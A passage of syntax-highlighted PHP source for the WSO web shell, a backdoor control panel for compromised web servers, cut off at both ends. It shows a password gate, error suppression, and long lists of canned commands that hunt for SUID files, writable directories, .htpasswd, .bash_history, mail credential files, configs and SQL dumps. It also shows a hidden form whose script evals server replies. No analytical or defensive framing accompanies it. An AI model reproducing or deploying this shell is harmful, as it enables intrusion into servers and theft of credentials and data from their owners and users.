<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]))</span>
    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$auth_pass</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="nx">wsoLogin</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">)</span>
    <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;win&#39;</span><span class="p">;</span>
<span class="k">else</span>
    <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;nix&#39;</span><span class="p">;</span>

<span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$safe_mode</span><span class="p">)</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="nv">$disable_functions</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
<span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$home_cwd</span><span class="p">);</span>
    <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="nv">$cwd</span><span class="p">[</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span>
    <span class="nv">$cwd</span> <span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]))</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;default_use_ajax&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span>
    <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s2">&quot;List Directory&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find index.php in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find *config*.php in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show active connections&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show running services&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net start&quot;</span><span class="p">,</span>
        <span class="s2">&quot;User accounts&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net user&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Show computers&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;net view&quot;</span><span class="p">,</span>
        <span class="s2">&quot;ARP Table&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;arp -a&quot;</span><span class="p">,</span>
        <span class="s2">&quot;IP Configuration&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ipconfig /all&quot;</span>
    <span class="p">);</span>
<span class="k">else</span>
    <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s2">&quot;List dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ls -lha&quot;</span><span class="p">,</span>
        <span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">,</span>
        <span class="s2">&quot;show opened ports&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">,</span>
        <span class="s2">&quot;process status&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;ps aux&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Find&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all suid files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find suid files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all sgid files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find sgid files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config.inc.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config* files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find config* files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all writable folders and files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all writable folders and files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all service.pwd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find service.pwd files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .htpasswd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .htpasswd files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .bash_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .bash_history files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find all .fetchmailrc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Locate&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate httpd.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate vhosts.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate vhosts.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate proftpd.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate psybnc.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate my.conf files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate admin.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;locate admin.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate cfg.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate cfg.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate conf.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate conf.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.dat files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.dat&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.inc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.inc&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.inc.php&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.inc.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config.default.php files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config.default.php&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate config* files &quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate config&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .conf files&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;locate &#39;.conf&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .pwd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.pwd&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .sql files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.sql&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .htpasswd files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.htpasswd&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .bash_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.bash_history&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .mysql_history files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.mysql_history&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate .fetchmailrc files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate &#39;.fetchmailrc&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate backup files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate backup&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate dump files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate dump&quot;</span><span class="p">,</span>
        <span class="s2">&quot;locate priv files&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;locate priv&quot;</span>
    <span class="p">);</span>

<span class="k">function</span> <span class="nf">wsoHeader</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;default_charset&#39;</span><span class="p">];</span>
    <span class="k">global</span> <span class="nv">$color</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;lt;title&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; - WSO &quot;</span> <span class="o">.</span> <span class="nx">WSO_VERSION</span> <span class="o">.</span><span class="s2">&quot;&amp;lt;/title&amp;gt;</span>
<span class="s2">&amp;lt;style&amp;gt;</span>
<span class="s2">body{background-color:#444;color:#e1e1e1;}</span>
<span class="s2">body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }</span>
<span class="s2">table.info{ color:#fff;background-color:#222; }</span>
<span class="s2">span,h1,a{ color: </span><span class="si">$color</span><span class="s2"> !important; }</span>
<span class="s2">span{ font-weight: bolder; }</span>
<span class="s2">h1{ border-left:5px solid </span><span class="si">$color</span><span class="s2">;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }</span>
<span class="s2">div.content{ padding: 5px;margin-left:5px;background-color:#333; }</span>
<span class="s2">a{ text-decoration:none; }</span>
<span class="s2">a:hover{ text-decoration:underline; }</span>
<span class="s2">.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }</span>
<span class="s2">.bigarea{ width:100%;height:250px; }</span>
<span class="s2">input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid </span><span class="si">$color</span><span class="s2">; font: 9pt Monospace,&#39;Courier New&#39;; }</span>
<span class="s2">form{ margin:0px; }</span>
<span class="s2">#toolsTbl{ text-align:center; }</span>
<span class="s2">.toolsInp{ width: 300px }</span>
<span class="s2">.main th{text-align:left;background-color:#5e5e5e;}</span>
<span class="s2">.main tr:hover{background-color:#5e5e5e}</span>
<span class="s2">.l1{background-color:#444}</span>
<span class="s2">.l2{background-color:#333}</span>
<span class="s2">pre{font-family:Courier,Monospace;}</span>
<span class="s2">&amp;lt;/style&amp;gt;</span>
<span class="s2">&amp;lt;script&amp;gt;</span>
<span class="s2">    var c_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="s2">    var a_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;</span>
<span class="s2">    var charset_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p1_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p2_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var p3_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="s2">    var d = document;</span>
<span class="s2">   function set(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;</span>
<span class="s2">       if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;</span>
<span class="s2">       if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;</span>
<span class="s2">       if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;</span>
<span class="s2">       if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;</span>
<span class="s2">       if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;</span>
<span class="s2">   }</span>
<span class="s2">   function g(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       set(a,c,p1,p2,p3,charset);</span>
<span class="s2">       d.mf.submit();</span>
<span class="s2">   }</span>
<span class="s2">   function a(a,c,p1,p2,p3,charset) {</span>
<span class="s2">       set(a,c,p1,p2,p3,charset);</span>
<span class="s2">       var params = &#39;ajax=true&#39;;</span>
<span class="s2">       for(i=0;i&amp;lt;d.mf.elements.length;i++)</span>
<span class="s2">           params += &#39;&amp;&#39;+d.mf.elements[i].name+&#39;=&#39;+encodeURIComponent(d.mf.elements[i].value);</span>
<span class="s2">       sr(&#39;&quot;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;, params);</span>
<span class="s2">   }</span>
<span class="s2">   function sr(url, params) {</span>
<span class="s2">       if (window.XMLHttpRequest)</span>
<span class="s2">           req = new XMLHttpRequest();</span>
<span class="s2">       else if (window.ActiveXObject)</span>
<span class="s2">           req = new ActiveXObject(&#39;Microsoft.XMLHTTP&#39;);</span>
<span class="s2">        if (req) {</span>
<span class="s2">            req.onreadystatechange = processReqChange;</span>
<span class="s2">            req.open(&#39;POST&#39;, url, true);</span>
<span class="s2">            req.setRequestHeader (&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</span>
<span class="s2">            req.send(params);</span>
<span class="s2">        }</span>
<span class="s2">   }</span>
<span class="s2">   function processReqChange() {</span>
<span class="s2">       if( (req.readyState == 4) )</span>
<span class="s2">           if(req.status == 200) {</span>
<span class="s2">               var reg = new RegExp(</span><span class="se">\&quot;</span><span class="s2">(</span><span class="se">\\\\</span><span class="s2">d+)([</span><span class="se">\\\\</span><span class="s2">S</span><span class="se">\\\\</span><span class="s2">s]*)</span><span class="se">\&quot;</span><span class="s2">, &#39;m&#39;);</span>
<span class="s2">               var arr=reg.exec(req.responseText);</span>
<span class="s2">               eval(arr[2].substr(0, arr[1]));</span>
<span class="s2">           } else alert(&#39;Request error!&#39;);</span>
<span class="s2">   }</span>
<span class="s2">&amp;lt;/script&amp;gt;</span>
<span class="s2">&amp;lt;head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;div style=&#39;position:absolute;width:100%;background-color:#444;top:0;left:0;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;form method=post name=mf style=&#39;display:none;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=a&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=c&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=p1&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=p2&amp;gt;</span>

<span class="s2">&amp;lt;input type=hidden name=p3&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=charset&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span><span class="o">?</span><span class="nv">$totalSpace</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="nv">$release</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">);</span>
    <span class="nv">$kernel</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
        <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">posix_geteuid</span><span class="p">());</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">posix_getegid</span><span class="p">());</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
        <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
